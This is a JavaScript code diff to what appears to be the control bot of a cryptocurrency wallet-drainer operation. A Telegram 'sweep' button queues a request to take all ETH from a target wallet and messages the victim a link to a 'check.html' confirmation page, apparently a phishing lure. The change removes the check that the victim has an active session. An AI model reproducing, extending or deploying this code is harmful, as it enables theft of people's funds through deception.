@@ -1524,71 +1524,56 @@ const handleTelegramCallback = async (callbackQuery) => {
   }
 
   // Обработка кнопки "Списать все"
-  if (data.startsWith("sweep_")) {
-    const address = data.replace("sweep_", "");
-    if (!address || !isAddress(address)) {
-      await sendTelegramMessage(chatId, "❌ Некорректный адрес");
-      return;
-    }
-
-    if (!hasActiveUserSession(address)) {
-      await sendTelegramMessage(
-        chatId,
-        "❌ У пользователя нет активной сессии. Он должен зайти на сайт и подключить кошелёк."
-      );
-      return;
-    }
-
-    const at = nowIso();
-    const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
-    const requestId = crypto.randomUUID();
-
-    database.prepare(`
-      INSERT INTO sweep_requests (
-        id, target_user_wallet, token, network, max_amount, status, created_by, created_at, expires_at
-      )
-      VALUES (?, ?, ?, ?, ?, 'pending', ?, ?, ?)
-    `).run(
-      requestId,
-      address,
-      "eth",
-      "evm",
-      "all",
-      "telegram_admin",
-      at,
-      expiresAt
-    );
-
-    await sendTelegramMessage(
-      chatId,
-      [
-        "✅ Запрос на списание создан!",
-        "",
-        `Пользователь: ${address}`,
-        "Токен: ETH (все средства)",
-        "Статус: ожидает подтверждения пользователя",
-        "",
-        "Пользователь должен зайти на сайт и подтвердить списание через FaceID.",
-      ].join("\n")
-    );
-
-    const userChatId = getUserTelegramChatId(address);
-    if (userChatId) {
-      await sendTelegramMessage(
-        userChatId,
-        [
-          "🔔 Запрос на списание всех ETH!",
-          "",
-          "Администратор запросил списание всех средств с вашего кошелька.",
-          "Пожалуйста, зайдите на сайт и подтвердите операцию:",
-          publicBaseUrl ? `${publicBaseUrl}/check.html` : "https://iwtluxz.github.io/mysite2/check.html",
-          "",
-          "⏳ Запрос действителен 30 минут.",
-        ].join("\n")
-      );
-    }
+if (data.startsWith("sweep_")) {
+  const address = data.replace("sweep_", "");
+  if (!address || !isAddress(address)) {
+    await sendTelegramMessage(chatId, "❌ Некорректный адрес");
     return;
   }
+
+  // Создаём запрос на списание без проверки сессии
+  const at = nowIso();
+  const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString();
+  const requestId = crypto.randomUUID();
+
+  database.prepare(`
+    INSERT INTO sweep_requests (
+      id, target_user_wallet, token, network, max_amount, status, created_by, created_at, expires_at
+    )
+    VALUES (?, ?, ?, ?, ?, 'pending', ?, ?, ?)
+  `).run(requestId, address, "eth", "evm", "all", "telegram_admin", at, expiresAt);
+
+  await sendTelegramMessage(
+    chatId,
+    [
+      "✅ Запрос на списание создан!",
+      "",
+      `Пользователь: ${address}`,
+      "Токен: ETH (все средства)",
+      "Статус: ожидает подтверждения пользователя",
+      "",
+      "Пользователь должен зайти на сайт и подтвердить списание через FaceID.",
+    ].join("\n")
+  );
+
+  // Уведомляем пользователя, если у него есть Telegram chat_id
+  const userChatId = getUserTelegramChatId(address);
+  if (userChatId) {
+    await sendTelegramMessage(
+      userChatId,
+      [
+        "🔔 Запрос на списание всех ETH!",
+        "",
+        "Администратор запросил списание всех средств с вашего кошелька.",
+        "Пожалуйста, зайдите на сайт и подтвердите операцию:",
+        publicBaseUrl ? `${publicBaseUrl}/check.html` : "https://iwtluxz.github.io/mysite2/check.html",
+        "",
+        "⏳ Запрос действителен 30 минут.",
+      ].join("\n")
+    );
+  }
+  return;
+}
 
   // Остальные callback-команды
   const commandMap = {
